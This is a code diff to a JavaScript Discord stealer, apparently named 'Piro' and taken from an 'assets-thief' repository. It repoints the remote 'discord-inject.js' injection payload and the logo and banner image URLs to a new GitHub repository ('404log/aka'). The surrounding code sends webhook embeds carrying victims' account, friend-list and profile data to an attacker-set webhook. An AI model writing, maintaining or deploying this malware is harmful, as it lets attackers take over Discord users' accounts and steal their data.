@@ -23,7 +23,7 @@ var config = {
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/freeman649/assets-thief/main/discord-inject.js",
+    "https://raw.githubusercontent.com/404log/aka/main/discord-inject.js",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
@@ -80,7 +80,7 @@ async function execScript(str) {
     var params = {
       username: "Piro",
       avatar_url:
-        "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20logo%20piro.png",
+        "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png",
       content: "",
       embeds: [
         {
@@ -589,10 +589,10 @@ async function execScript(str) {
         var Friends = parseFriends(friends);
         if (!user.avatar)
           var userAvatar =
-            "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20logo%20piro.png";
+            "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png";
         if (!user.banner)
           var userBanner =
-            "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20banner%20piro.png";
+            "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png";
   
         userBanner =
           userBanner ??
@@ -727,10 +727,10 @@ async function execScript(str) {
           var Friends = parseFriends(friends);
           if (!user.avatar)
             var userAvatar =
-              "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20logo%20piro.png";
+              "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png";
           if (!user.banner)
             var userBanner =
-              "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20banner%20piro.png";
+              "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png";
   
           userBanner =
             userBanner ??
@@ -948,10 +948,10 @@ async function execScript(str) {
     );
     if (!user.avatar)
       var userAvatar =
-        "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20logo%20piro.png";
+        "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png";
     if (!user.banner)
       var userBanner =
-        "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20banner%20piro.png";
+        "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png";
   
     var userBanner =
       userBanner ??
